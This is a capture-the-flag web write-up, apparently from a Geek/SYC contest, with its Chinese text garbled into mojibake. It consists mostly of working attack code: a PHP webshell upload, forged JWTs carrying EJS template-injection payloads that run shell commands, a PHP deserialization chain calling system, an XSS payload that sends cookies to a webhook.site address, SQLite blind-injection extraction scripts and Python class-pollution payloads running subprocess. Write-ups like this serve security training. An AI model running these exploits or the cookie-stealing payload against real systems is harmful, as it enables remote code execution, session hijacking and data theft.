<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<url>
<loc>http://localhost/</loc>
<changefreq>weekly</changefreq>
</url>
<url>
<loc>http://localhost/aa__^^.php</loc>
<changefreq>never</changefreq>
</url>
</urlset>
```

è®¿é—®

```
http://019a4c9b-98e4-7292-87d0-7986a0bfbc04.geek.ctfplus.cn/aa__%5E%5E.php


Warning: Undefined array key "filename" in /var/www/html/aa__^^.php on line 3

Deprecated: strlen(): Passing null to parameter #1 ($string) of type string is deprecated in /var/www/html/aa__^^.php on line 3

Warning: Undefined array key "filename" in /var/www/html/aa__^^.php on line 4

Deprecated: readfile(): Passing null to parameter #1 ($filename) of type string is deprecated in /var/www/html/aa__^^.php on line 4

Fatal error: Uncaught ValueError: Path cannot be empty in /var/www/html/aa__^^.php:4 Stack trace: #0 /var/www/html/aa__^^.php(4): readfile('') #1 {main} thrown in /var/www/html/aa__^^.php on line 4
```

è®¿é—®

```
view-source:http://019a4c9b-98e4-7292-87d0-7986a0bfbc04.geek.ctfplus.cn/aa__%5E%5E.php?filename=aa__^^.php


<?php
$flag = fopen('/my_secret.txt', 'r');
if (strlen($_GET['filename']) < 11) {
  readfile($_GET['filename']);
} else {
  echo "Filename too long";
}
```

```
import requests
import time

# åŸºç¡€URL
base_url = "http://019a5430-d306-780a-84b1-df68e9d3f459.geek.ctfplus.cn/aa__%5E%5E.php"


def try_fd(fd_value, fd_type):
    """
    å°è¯•è®¿é—®ç‰¹å®šçš„æ–‡ä»¶æè¿°ç¬¦
    """
    if fd_type == "dev":
        filename = f"/dev/fd/{fd_value}"
    else:  # php
        filename = f"php://fd/{fd_value}"

    # æ£€æŸ¥é•¿åº¦é™åˆ¶
    if len(filename) >= 11:
        return None

    url = f"{base_url}?filename={filename}"

    try:
        response = requests.get(url, timeout=5)

        # æ£€æŸ¥å“åº”å†…å®¹æ˜¯å¦åŒ…å«é”™è¯¯ä¿¡æ¯
        if "Warning" not in response.text and "No such file" not in response.text:
            # æ£€æŸ¥æ˜¯å¦è¿”å›äº†æœ‰æ„ä¹‰çš„å†…å®¹ï¼ˆä¸æ˜¯ç©ºæˆ–é”™è¯¯ï¼‰
            if response.text.strip() and len(response.text.strip()) > 0:
                return response.text
    except Exception as e:
        print(f"Error accessing {filename}: {e}")

    return None


def main():
    print("å¼€å§‹å°è¯•è®¿é—®æ–‡ä»¶æè¿°ç¬¦...")

    # å°è¯• /dev/fd/0 åˆ° /dev/fd/99
    print("\nå°è¯• /dev/fd/ è·¯å¾„:")
    for i in range(100):
        result = try_fd(i, "dev")
        if result:
            print(f"[+] /dev/fd/{i} è¿”å›æœ‰æ•ˆå†…å®¹:")
            print(result)
            print("-" * 50)

        # æ·»åŠ å»¶è¿Ÿé¿å…è¯·æ±‚è¿‡å¿«
        time.sleep(0.1)

    # å°è¯• php://fd/0 åˆ° php://fd/9 (é•¿åº¦é™åˆ¶)
    print("\nå°è¯• php://fd/ è·¯å¾„:")
    for i in range(10):  # åªåˆ°9ï¼Œå› ä¸º10é•¿åº¦è¶…è¿‡é™åˆ¶
        result = try_fd(i, "php")
        if result:
            print(f"[+] php://fd/{i} è¿”å›æœ‰æ•ˆå†…å®¹:")
            print(result)
            print("-" * 50)

        time.sleep(0.1)

    # å°è¯•ä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶è·¯å¾„
    special_paths = [
        "/dev/stdin",
        "/dev/stdout",
        "/dev/stderr",
        "/proc/self/fd/3",
        "/proc/self/fd/4",
        "/proc/self/fd/5"
    ]

    print("\nå°è¯•ç‰¹æ®Šæ–‡ä»¶è·¯å¾„:")
    for path in special_paths:
        if len(path) < 11:
            url = f"{base_url}?filename={path}"
            try:
                response = requests.get(url, timeout=5)
                if "Warning" not in response.text and "No such file" not in response.text:
                    if response.text.strip() and len(response.text.strip()) > 0:
                        print(f"[+] {path} è¿”å›æœ‰æ•ˆå†…å®¹:")
                        print(response.text)
                        print("-" * 50)
            except Exception as e:
                print(f"Error accessing {path}: {e}")

            time.sleep(0.1)


if __name__ == "__main__":
    main()
```

flagåœ¨13

# One last image

å¯ä»¥ç›´æ¥æŠ“åŒ…ä¸Šä¼ è¿™æ ·çš„

```
Content-Disposition: form-data; name="image"; filename="1.php"
Content-Type: image/jpeg

<?=`env`;?>
```

è¿”å›ä¼šç»™è·¯å¾„

```
PIL.UnidentifiedImageError: cannot identify image file '/var/www/html/uploads/99b6b90e-172d-47ac-819c-a99cb2cf1ad5.php'
```

å®Œäº‹

```
CHALLENGE_019A2F4D_887A_019A49C3_BA5A_PORT_8080_TCP_PROTO=tcp
CHALLENGE_019A1BE7_3022_019A33FF_2816_PORT_9999_TCP_PROTO=tcp
FLAG=SYC{0_M3_de_t0u_019a57d6e2f0760ab29c268a4c2735ef}
CHALLENGE_019A09FC_908C_019A1159_B729_PORT=tcp://10.108.3.98:3000
CHALLENGE_019A09FC_908C_019A1159_B729_SERVICE_PORT=3000
CHALLENGE_019A14F3_38E2_019A168D_837E_SERVICE_PORT=8080
```





# Expression

å¼ºä¸€ç‚¹çš„aiç›´æ¥å¹²ç©¿äº†ï¼ˆ

```
import jwt
import base64

# JWT å¯†é’¥
SECRET = "secret"

# åŸå§‹ token
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjFAMS5jb20iLCJ1c2VybmFtZSI6InVzZXJfMmEzZDM3ZDc3ZjkxIiwiaWF0IjoxNzYyNDE0NTUyLCJleHAiOjE3NjMwMTkzNTJ9.AKXiy1-yOrrKZsdrjpdM8mm_q_04Ieucg56ORlB3C50"

# è§£ç åŸå§‹ token æŸ¥çœ‹å†…å®¹
try:
    decoded = jwt.decode(original_token, SECRET, algorithms=["HS256"])
    print("åŸå§‹ Token å†…å®¹:")
    print(decoded)
    print("\n" + "=" * 60 + "\n")
except:
    decoded = jwt.decode(original_token, options={"verify_signature": False})
    print("åŸå§‹ Token å†…å®¹ (æœªéªŒè¯ç­¾å):")
    print(decoded)
    print("\n" + "=" * 60 + "\n")

# EJS æ¨¡æ¿æ³¨å…¥ Payload
# å¸¸è§çš„ RCE payload
payloads = {
    "è¯»å–flag": "<%= global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>",
    "åˆ—ç›®å½•": "<%= global.process.mainModule.require('child_process').execSync('ls -la /').toString() %>",
    "æŸ¥æ‰¾flag": "<%= global.process.mainModule.require('child_process').execSync('find / -name flag* 2>/dev/null').toString() %>",
    "è¯»å–å½“å‰ç›®å½•": "<%= global.process.mainModule.require('child_process').execSync('ls -la').toString() %>",
    "è¯»å–ç¯å¢ƒå˜é‡": "<%= global.process.mainModule.require('child_process').execSync('env').toString() %>",
}

print("ç”Ÿæˆçš„æ¶æ„ Token:\n")

for desc, payload in payloads.items():
    # æ„é€ æ–°çš„ payload - åœ¨ username å­—æ®µæ³¨å…¥
    malicious_payload = {
        "email": decoded["email"],
        "username": payload,
        "iat": decoded["iat"],
        "exp": decoded["exp"]
    }

    # ç”Ÿæˆæ–°çš„ token
    malicious_token = jwt.encode(malicious_payload, SECRET, algorithm="HS256")

    print(f"{desc}:")
    print(malicious_token)
    print()

# ä¹Ÿå¯ä»¥åœ¨ email å­—æ®µæ³¨å…¥
print("\n" + "=" * 60)
print("åœ¨ email å­—æ®µæ³¨å…¥:\n")

payload = "<%= global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>"
malicious_payload = {
    "email": payload,
    "username": decoded["username"],
    "iat": decoded["iat"],
    "exp": decoded["exp"]
}

malicious_token = jwt.encode(malicious_payload, SECRET, algorithm="HS256")
print("Token:")
print(malicious_token)
```

ç”¨ç»å…¸çš„ç¯å¢ƒå˜é‡ï¼ˆ



```
FLAG=SYC{019a581631ba794ea3f7f7f9f5af5788}
```



# popself

è§£é¢˜è„šæœ¬

```
<?php
class All_in_one
{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $SamsÄra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;
}

class summer {
    public static function find_myself(){
        return "summer";
    }
}

// æ„é€ POPé“¾
$obj1 = new All_in_one();
$obj2 = new All_in_one();
$obj3 = new All_in_one();
$obj4 = new All_in_one();
$obj5 = new All_in_one();

// obj1: __destruct - MD5å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡
$obj1->KiraKiraAyu = "0e1138100474";  
$obj1->K4per = "s1885207154a";
$obj1->QYQS = $obj2;

// obj2: __set
$obj2->Fox = ['summer', 'find_myself'];
$obj2->komiko = $obj3;
$obj2->L = "1e5";  // ç§‘å­¦è®¡æ•°æ³•ï¼šstrlen=3, value=100000
$obj2->sleep3r = $obj4;

// obj3: __call
// æ— éœ€è®¾ç½®

// obj4: __toString
$obj4->_4ak5ra = $obj5;

// obj5: __invoke - RCE
$obj5->SamsÄra = 'system';
$obj5->ivory = 'env';

$payload = serialize($obj1);

echo "=== Payload ===\n";
echo $payload . "\n\n";

echo "=== URL (æ³¨æ„å‚æ•°åä½¿ç”¨ç‚¹å·) ===\n";
echo "?24.SYC.zip=" . urlencode($payload) . "\n\n";

echo "=== cURL å‘½ä»¤ç¤ºä¾‹ ===\n";
echo "curl '" . "http://target.com/?24[SYC.zip=" . urlencode($payload) . "'\n";
?>
```__
```

å—¯ç„¶åå°±è¿‡äº†

éš¾ç‚¹1æ˜¯åŒmd5ï¼Œaiå¸®æˆ‘æ‰¾å‡ºæ¥äº†

éš¾ç‚¹2æ˜¯ä¼ å‚ï¼Œæˆ‘è‡ªå·±æœå‡ºæ¥äº†

```
?24[SYC.zip=
```

éš¾ç‚¹3æ˜¯å†™ä»£ç ï¼Œaiå¸®æˆ‘å†™äº†



# Xross The Finish Line

aiè¯´çš„ï¼Œæˆ‘å°±å‘Šè¯‰äº†å®ƒå“ªäº›ä¸èƒ½ç”¨ï¼ˆ

```
å®Œæ•´çš„Payload
html

<svg/**/onload=location=`https://webhook.site/cd4b0016-aa62-4c9b-afbf-3ab679460197?c=`+document.cookie>
æ“ä½œæ­¥éª¤
1. æäº¤Payload
å°†ä¸Šé¢çš„payloadå¤åˆ¶åˆ°ç•™è¨€æ¿çš„è¾“å…¥æ¡†ä¸­ï¼Œç‚¹å‡»æäº¤ã€‚

2. æŠ¥å‘Šç»™ç®¡ç†å‘˜
æäº¤æˆåŠŸåï¼Œç‚¹å‡»é¡µé¢ä¸Šçš„ "æŠ¥å‘Šç»™ç®¡ç†å‘˜" æŒ‰é’®ï¼ˆæˆ–ç±»ä¼¼çš„æŒ‰é’®ï¼‰ã€‚

3. æŸ¥çœ‹Webhookæ¥æ”¶
å›åˆ°ä½ çš„webhooké¡µé¢ï¼šhttps://webhook.site/#!/view/cd4b0016-aa62-4c9b-afbf-3ab679460197

ç­‰å¾…å‡ ç§’é’Ÿï¼Œåº”è¯¥ä¼šçœ‹åˆ°ä¸€ä¸ªæ–°çš„è¯·æ±‚ï¼ŒURLä¸­çš„ c= å‚æ•°åé¢å°±æ˜¯ç®¡ç†å‘˜çš„cookieã€‚
```

# Sequal No Uta

ç¬¬ä¸€æ­¥

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLite å¸ƒå°”ç›²æ³¨ - è·å–è¡¨å
"""

import requests
from urllib.parse import quote
import string
import time

# é…ç½®
BASE_URL = "http://019a5913-74c8-7c1e-b057-b96022cf135c.geek.ctfplus.cn/check.php"
SPACE = "/**/"  # WAFç»•è¿‡ï¼šä½¿ç”¨/**/ä»£æ›¿ç©ºæ ¼


def send_payload(payload):
    """å‘é€payloadå¹¶è¿”å›å“åº”"""
    try:
        url = f"{BASE_URL}?name={quote(payload)}"
        response = requests.get(url, timeout=10)
        return response.text.strip()
    except Exception as e:
        print(f"[ERROR] è¯·æ±‚å¤±è´¥: {e}")
        return ""


def is_true(response):
    """åˆ¤æ–­SQLæ¡ä»¶æ˜¯å¦ä¸ºçœŸ"""
    return "è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ" in response


def extract_string(sql_query, max_length=200):
    """
    ä½¿ç”¨å¸ƒå°”ç›²æ³¨æå–å­—ç¬¦ä¸²
    sql_query: éœ€è¦æŸ¥è¯¢çš„SQLè¯­å¥ï¼ˆä¸å«æ‹¬å·ï¼‰
    """
    result = ""
    # å­—ç¬¦é›†ï¼šå¸¸è§å­—ç¬¦
    charset = string.ascii_letters + string.digits + "_,"

    print(f"[*] å¼€å§‹æå–æ•°æ®...")
    print(f"[*] SQLæŸ¥è¯¢: {sql_query}")
    print(f"[*] å­—ç¬¦é›†: {charset}")
    print()

    for position in range(1, max_length + 1):
        found = False

        for char in charset:
            # æ„é€ payload: guest' and substr((æŸ¥è¯¢è¯­å¥), ä½ç½®, 1) = 'å­—ç¬¦'--
            condition = f"substr(({sql_query}),{position},1)='{char}'"
            payload = f"guest'{SPACE}and{SPACE}{condition}--"

            response = send_payload(payload)

            if is_true(response):
                result += char
                print(f"\r[+] å½“å‰ç»“æœ: {result}", end='', flush=True)
                found = True
                break

            # é¿å…è¯·æ±‚è¿‡å¿«
            time.sleep(0.05)

        # å¦‚æœå½“å‰ä½ç½®æ²¡æœ‰åŒ¹é…çš„å­—ç¬¦ï¼Œè¯´æ˜å·²ç»åˆ°è¾¾æœ«å°¾
        if not found:
            print(f"\n[âœ“] æå–å®Œæˆ!")
            break

    return result


def main():
    print("=" * 70)
    print("  SQLite å¸ƒå°”ç›²æ³¨ - è·å–æ‰€æœ‰è¡¨å")
    print("=" * 70)
    print()

    # æ„é€ æŸ¥è¯¢æ‰€æœ‰è¡¨åçš„SQL
    # SQLiteç³»ç»Ÿè¡¨ï¼šsqlite_master
    # æŸ¥è¯¢è¯­å¥ï¼šSELECT group_concat(name) FROM sqlite_master WHERE type='table'

    sql_query = f"select{SPACE}group_concat(name){SPACE}from{SPACE}sqlite_master{SPACE}where{SPACE}type='table'"

    print(f"[*] ç›®æ ‡URL: {BASE_URL}")
    print(f"[*] ç»•è¿‡æ–¹å¼: ä½¿ç”¨ /**/ ä»£æ›¿ç©ºæ ¼")
    print()

    # å…ˆæµ‹è¯•åŸºæœ¬çš„å¸ƒå°”ç›²æ³¨æ˜¯å¦å¯è¡Œ
    print("[*] æµ‹è¯•å¸ƒå°”ç›²æ³¨...")
    test_true = send_payload(f"guest'{SPACE}and{SPACE}1=1--")
    test_false = send_payload(f"guest'{SPACE}and{SPACE}1=2--")

    if is_true(test_true) and not is_true(test_false):
        print("[âœ“] å¸ƒå°”ç›²æ³¨å¯ç”¨!")
        print(f"    Trueæ¡ä»¶: {test_true[:50]}...")
        print(f"    Falseæ¡ä»¶: {test_false[:50]}...")
    else:
        print("[âœ—] å¸ƒå°”ç›²æ³¨æµ‹è¯•å¤±è´¥!")
        return

    print()

    # æå–è¡¨å
    tables = extract_string(sql_query, max_length=200)

    print()
    print("=" * 70)
    print(f"[ç»“æœ] æ•°æ®åº“ä¸­çš„è¡¨å: {tables}")
    print("=" * 70)

    # åˆ†å‰²å¹¶æ˜¾ç¤º
    if tables:
        table_list = tables.split(',')
        print(f"\n[*] å…±æ‰¾åˆ° {len(table_list)} ä¸ªè¡¨:")
        for i, table in enumerate(table_list, 1):
            print(f"    {i}. {table}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] ç”¨æˆ·ä¸­æ–­")
    except Exception as e:
        print(f"\n[ERROR] {e}")
        import traceback

        traceback.print_exc()
```

è¾“å‡º

```
[] å…±æ‰¾åˆ° 2 ä¸ªè¡¨: 1. users 2. sqlite_sequence

ä¸‹ä¸€æ­¥è„šæœ¬
```

ç¬¬äºŒæ­¥

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLite å¸ƒå°”ç›²æ³¨ - äºŒåˆ†æ³•è·å–usersè¡¨çš„åˆ—åï¼ˆå®Œæ•´è¾“å‡ºç‰ˆï¼‰
"""

import requests
from urllib.parse import quote
import time

# é…ç½®
BASE_URL = "http://019a5913-74c8-7c1e-b057-b96022cf135c.geek.ctfplus.cn/check.php"
SPACE = "/**/"
TIMEOUT = 30
MAX_RETRIES = 3
DELAY = 0.1


def send_payload(payload, retry=0):
    """å‘é€payloadå¹¶è¿”å›å“åº”"""
    try:
        url = f"{BASE_URL}?name={quote(payload)}"
        response = requests.get(url, timeout=TIMEOUT)
        return response.text.strip()
    except:
        if retry < MAX_RETRIES:
            time.sleep(2)
            return send_payload(payload, retry + 1)
        raise


def is_true(response):
    """åˆ¤æ–­SQLæ¡ä»¶æ˜¯å¦ä¸ºçœŸ"""
    return "è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ" in response


def binary_search_char(sql_query, position):
    """äºŒåˆ†æ³•æŸ¥æ‰¾æŒ‡å®šä½ç½®çš„å­—ç¬¦"""
    low = 32
    high = 126

    # æ£€æŸ¥è¯¥ä½ç½®æ˜¯å¦å­˜åœ¨å­—ç¬¦
    condition = f"length(({sql_query}))>={position}"
    payload = f"guest'{SPACE}and{SPACE}{condition}--"

    if not is_true(send_payload(payload)):
        return 0  # åˆ°è¾¾æœ«å°¾

    time.sleep(DELAY)

    # äºŒåˆ†æŸ¥æ‰¾ASCIIå€¼
    while low <= high:
        mid = (low + high) // 2
        condition = f"unicode(substr(({sql_query}),{position},1))>{mid}"
        payload = f"guest'{SPACE}and{SPACE}{condition}--"

        if is_true(send_payload(payload)):
            low = mid + 1
        else:
            high = mid - 1

        time.sleep(DELAY)

    return low


def extract_string(sql_query, max_length=500):
    """ä½¿ç”¨äºŒåˆ†æ³•æå–å­—ç¬¦ä¸²"""
    result = ""

    for position in range(1, max_length + 1):
        ascii_val = binary_search_char(sql_query, position)

        if ascii_val == 0:
            print(f"\n[âœ“] æå–å®Œæˆ! æ€»é•¿åº¦: {len(result)} å­—ç¬¦")
            break

        char = chr(ascii_val)
        result += char

        # åªæ˜¾ç¤ºå½“å‰å­—ç¬¦å’Œä½ç½®ï¼Œä¸æˆªæ–­
        print(f"\r[+] ä½ç½® {position:3d} | ASCII:{ascii_val:3d} | å­—ç¬¦:'{char}' | æ€»é•¿åº¦:{len(result)}   ",
              end='', flush=True)

    print()
    return result


def main():
    print("=" * 70)
    print("  äºŒåˆ†æ³•è·å– users è¡¨çš„åˆ—å")
    print("=" * 70)
    print()

    # æŸ¥è¯¢usersè¡¨çš„å»ºè¡¨è¯­å¥
    sql_query = f"select{SPACE}sql{SPACE}from{SPACE}sqlite_master{SPACE}where{SPACE}type='table'{SPACE}and{SPACE}name='users'"

    print(f"[*] ç›®æ ‡: users è¡¨çš„å»ºè¡¨è¯­å¥")
    print(f"[*] å¼€å§‹æå–...\n")

    try:
        result = extract_string(sql_query, max_length=1000)

        print()
        print("=" * 70)
        print("[å®Œæ•´ç»“æœ]")
        print("=" * 70)
        print(result)  # å®Œæ•´è¾“å‡ºï¼Œä¸æˆªæ–­
        print("=" * 70)
        print(f"æ€»é•¿åº¦: {len(result)} å­—ç¬¦")
        print("=" * 70)

        # è§£æåˆ—å
        if result and '(' in result and ')' in result:
            print("\n[*] è§£æå­—æ®µå:")
            cols_part = result[result.index('(') + 1:result.rindex(')')]

            # æ›´ç²¾ç¡®çš„è§£æ
            columns = []
            for col in cols_part.split(','):
                col = col.strip()
                if col:
                    # æå–å­—æ®µåï¼ˆç¬¬ä¸€ä¸ªå•è¯ï¼‰
                    col_name = col.split()[0] if col.split() else col
                    columns.append(col_name)

            print(f"\nâœ… å…±æ‰¾åˆ° {len(columns)} ä¸ªå­—æ®µ:")
            for i, col in enumerate(columns, 1):
                print(f"    {i}. {col}")

            print(f"\nğŸ’¡ ä¸‹ä¸€æ­¥: æŸ¥è¯¢åŒ…å« flag çš„å­—æ®µå†…å®¹")

    except KeyboardInterrupt:
        print("\n[!] ç”¨æˆ·ä¸­æ–­")
    except Exception as e:
        print(f"\n[ERROR] {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
```

ç»“æœ

```
[*] ç›®æ ‡: users è¡¨çš„å»ºè¡¨è¯­å¥
[*] å¼€å§‹æå–...

[+] ä½ç½® 209 | ASCII: 41 | å­—ç¬¦:')' | æ€»é•¿åº¦:209   
[âœ“] æå–å®Œæˆ! æ€»é•¿åº¦: 209 å­—ç¬¦


======================================================================
[å®Œæ•´ç»“æœ]
======================================================================
CREATE TABLE users (         id INTEGER PRIMARY KEY AUTOINCREMENT,         username TEXT UNIQUE NOT NULL,         password TEXT NOT NULL,         is_active INTEGER NOT NULL DEFAULT 1,         secret TEXT     )
======================================================================
æ€»é•¿åº¦: 209 å­—ç¬¦
======================================================================

[*] è§£æå­—æ®µå:

âœ… å…±æ‰¾åˆ° 5 ä¸ªå­—æ®µ:
    1. id
    2. username
    3. password
    4. is_active
    5. secret

ğŸ’¡ ä¸‹ä¸€æ­¥: æŸ¥è¯¢åŒ…å« flag çš„å­—æ®µå†…å®¹
```

å¾ˆæ˜æ˜¾æ˜¯secret

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLite å¸ƒå°”ç›²æ³¨ - äºŒåˆ†æ³•çˆ†ç ´ secret å­—æ®µ
"""

import requests
from urllib.parse import quote
import time

# é…ç½®
BASE_URL = "http://019a5913-74c8-7c1e-b057-b96022cf135c.geek.ctfplus.cn/check.php"
SPACE = "/**/"
TIMEOUT = 30
MAX_RETRIES = 3
DELAY = 0.1


def send_payload(payload, retry=0):
    """å‘é€payloadå¹¶è¿”å›å“åº”"""
    try:
        url = f"{BASE_URL}?name={quote(payload)}"
        response = requests.get(url, timeout=TIMEOUT)
        return response.text.strip()
    except:
        if retry < MAX_RETRIES:
            time.sleep(2)
            return send_payload(payload, retry + 1)
        raise


def is_true(response):
    """åˆ¤æ–­SQLæ¡ä»¶æ˜¯å¦ä¸ºçœŸ"""
    return "è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ" in response


def binary_search_char(sql_query, position):
    """äºŒåˆ†æ³•æŸ¥æ‰¾æŒ‡å®šä½ç½®çš„å­—ç¬¦"""
    low = 32
    high = 126

    # æ£€æŸ¥è¯¥ä½ç½®æ˜¯å¦å­˜åœ¨å­—ç¬¦
    condition = f"length(({sql_query}))>={position}"
    payload = f"guest'{SPACE}and{SPACE}{condition}--"

    if not is_true(send_payload(payload)):
        return 0  # åˆ°è¾¾æœ«å°¾

    time.sleep(DELAY)

    # äºŒåˆ†æŸ¥æ‰¾ASCIIå€¼
    while low <= high:
        mid = (low + high) // 2
        condition = f"unicode(substr(({sql_query}),{position},1))>{mid}"
        payload = f"guest'{SPACE}and{SPACE}{condition}--"

        if is_true(send_payload(payload)):
            low = mid + 1
        else:
            high = mid - 1

        time.sleep(DELAY)

    return low


def extract_string(sql_query, max_length=500):
    """ä½¿ç”¨äºŒåˆ†æ³•æå–å­—ç¬¦ä¸²"""
    result = ""

    for position in range(1, max_length + 1):
        ascii_val = binary_search_char(sql_query, position)

        if ascii_val == 0:
            print(f"\n[âœ“] æå–å®Œæˆ! æ€»é•¿åº¦: {len(result)} å­—ç¬¦")
            break

        char = chr(ascii_val)
        result += char

        print(f"\r[+] ä½ç½® {position:3d} | ASCII:{ascii_val:3d} | '{char}' | æ€»é•¿åº¦:{len(result)}   ",
              end='', flush=True)

    print()
    return result


def main():
    print("=" * 70)
    print("  ğŸ¯ çˆ†ç ´ users.secret å­—æ®µ")
    print("=" * 70)
    print()

    # å…ˆæŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·çš„secretï¼ˆç”¨é€—å·è¿æ¥ï¼‰
    sql_query = f"select{SPACE}group_concat(secret){SPACE}from{SPACE}users"

    print(f"[*] æŸ¥è¯¢: æ‰€æœ‰ç”¨æˆ·çš„ secret å­—æ®µ")
    print(f"[*] SQL: SELECT group_concat(secret) FROM users")
    print(f"[*] å¼€å§‹æå–...\n")

    try:
        result = extract_string(sql_query, max_length=1000)

        print()
        print("=" * 70)
        print("[ğŸ’ SECRET å­—æ®µå†…å®¹]")
        print("=" * 70)
        print(result)
        print("=" * 70)
        print(f"æ€»é•¿åº¦: {len(result)} å­—ç¬¦")
        print("=" * 70)

        # å¦‚æœåŒ…å«é€—å·ï¼Œè¯´æ˜æœ‰å¤šä¸ªå€¼
        if ',' in result:
            secrets = result.split(',')
            print(f"\n[*] å…±æ‰¾åˆ° {len(secrets)} ä¸ª secret å€¼:")
            for i, secret in enumerate(secrets, 1):
                print(f"    {i}. {secret}")

        # æ£€æŸ¥æ˜¯å¦åŒ…å«flagæ ¼å¼
        if 'flag{' in result.lower() or 'ctf{' in result.lower():
            print("\nğŸš© [!!!] å‘ç° FLAG !!!")

    except KeyboardInterrupt:
        print("\n[!] ç”¨æˆ·ä¸­æ–­")
    except Exception as e:
        print(f"\n[ERROR] {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
```

æœ€ç»ˆç»“æœ

```
SYC{YourPoem-019a591374b17848a606d8ecf3593749}
```

# ç™¾å¹´ç»§æ‰¿

å¾ˆæœ‰æ„æ€ï¼Œè¿™å‡ ä¸ªç©æ„ä¸€ç”¨è¿™é¢˜åˆ«åšäº†ï¼ˆ

```
{
  "weapon": "sword",
  "__class__": {
    "__base__": {
      "__base__": {
        "__getattribute__": "lambda self, name: __import__('subprocess').getoutput('cat /flag') if name == 'weapon' else object.__getattribute__(self, name)"
      }
    }
  }
}


{
  "weapon": "sword",
  "__class__": {
    "__setattr__": "__init__"
  }
}
```





```
ä¸Šæ ¡å·²åˆ›å»ºã€‚
ä¸Šæ ¡ç»§æ‰¿äºä»–çš„çˆ¶äº²,ä»–çš„çˆ¶äº²ç»§æ‰¿äºäººç±»
æ—¶é—´æµé€ï¼šå·å…¥æ­¦è£…èµ·ä¹‰ï¼šå‘½è¿ä¸æˆ˜äº‰äº¤ç»‡ã€‚
æ—¶é—´æµé€ï¼šæŠ‰æ‹©æ—¶åˆ»ï¼šä¸Šæ ¡éœ€è¦åšå‡ºé€‰æ‹©ï¼ˆæ­¦å™¨ä¸ç­–ç•¥ï¼‰ã€‚
ä¸Šæ ¡é€‰æ‹©ï¼š{"weapon": {"__class__": {"__base__": {"__base__": {"__str__": "lambda self: __import__('subprocess').getoutput('ls /')"}}}}}
é€‰æ‹©å·²ç”Ÿæ•ˆã€‚
äº‹ä»¶ï¼šä¸Šæ ¡ä½¿ç”¨ {'__class__': {'__base__': {'__base__': {'__str__': "lambda self: __import__('subprocess').getoutput('ls /')"}}}}ï¼Œé‡‡å– ambush ç­–ç•¥ã€‚ä¸–ç•Œçº¿å˜åŠ¨...
(ä¸Šæ ¡çš„weaponå±æ€§è¢«èµ‹å€¼ä¸º{'__class__': {'__base__': {'__base__': {'__str__': "lambda self: __import__('subprocess').getoutput('ls /')"}}}},tacticå±æ€§è¢«èµ‹å€¼ä¸ºambush)
æ—¶é—´æµé€ï¼šå®¿å‘½å»¶ç»­ï¼šè¡Œå†›ä¸é€€å´ã€‚
æ—¶é—´æµé€ï¼šé¢å¯¹è¡Œåˆ‘é˜Ÿï¼šå‘½è¿çš„å®¡åˆ¤å³å°†åˆ°æ¥ã€‚
è¡Œåˆ‘é˜Ÿï¼šå¼€å§‹æ‰§è¡Œåˆ¤å†³ã€‚
è¡Œåˆ‘é˜Ÿä¹Ÿç»§æ‰¿äºäººç±»
ä¸´æ­»ä¹‹å‰,ä¸Šæ ¡ç›®å…‰ç„ç€è¡Œåˆ‘é˜Ÿçš„ä½©å‰‘,ä¸Šé¢åˆ†æ˜å†™ç€ï¼š
lambda executor, target: (target.__del__(), setattr(target, 'alive', False), 'å¤„å†³æˆåŠŸ')
è¿™æ˜¯äººç±»è‡ªå¤ä»¥æ¥å°±æ‹¥æœ‰çš„execute_methodå±æ€§...
å¤„å†³æˆåŠŸ
æ—¶é—´æµé€ï¼šç»“å±€ï¼šå‘½è¿å¦‚æ²™æ¼èˆ¬å€¾æ³»â€¦â€¦


ä¸Šæ ¡å·²åˆ›å»ºã€‚
ä¸Šæ ¡ç»§æ‰¿äºä»–çš„çˆ¶äº²,ä»–çš„çˆ¶äº²ç»§æ‰¿äºäººç±»
æ—¶é—´æµé€ï¼šå·å…¥æ­¦è£…èµ·ä¹‰ï¼šå‘½è¿ä¸æˆ˜äº‰äº¤ç»‡ã€‚
æ—¶é—´æµé€ï¼šæŠ‰æ‹©æ—¶åˆ»ï¼šä¸Šæ ¡éœ€è¦åšå‡ºé€‰æ‹©ï¼ˆæ­¦å™¨ä¸ç­–ç•¥ï¼‰ã€‚
ä¸Šæ ¡é€‰æ‹©ï¼š{"weapon": {"__class__": {"__base__": {"__subclasses__": "å¯èƒ½åŒ…å«æœ‰ç”¨ä¿¡æ¯"}}}}
é€‰æ‹©å·²ç”Ÿæ•ˆã€‚
äº‹ä»¶ï¼šä¸Šæ ¡ä½¿ç”¨ {'__class__': {'__base__': {'__subclasses__': 'å¯èƒ½åŒ…å«æœ‰ç”¨ä¿¡æ¯'}}}ï¼Œé‡‡å– ambush ç­–ç•¥ã€‚ä¸–ç•Œçº¿å˜åŠ¨...
(ä¸Šæ ¡çš„weaponå±æ€§è¢«èµ‹å€¼ä¸º{'__class__': {'__base__': {'__subclasses__': 'å¯èƒ½åŒ…å«æœ‰ç”¨ä¿¡æ¯'}}},tacticå±æ€§è¢«èµ‹å€¼ä¸ºambush)
æ—¶é—´æµé€ï¼šå®¿å‘½å»¶ç»­ï¼šè¡Œå†›ä¸é€€å´ã€‚
æ—¶é—´æµé€ï¼šé¢å¯¹è¡Œåˆ‘é˜Ÿï¼šå‘½è¿çš„å®¡åˆ¤å³å°†åˆ°æ¥ã€‚
è¡Œåˆ‘é˜Ÿï¼šå¼€å§‹æ‰§è¡Œåˆ¤å†³ã€‚
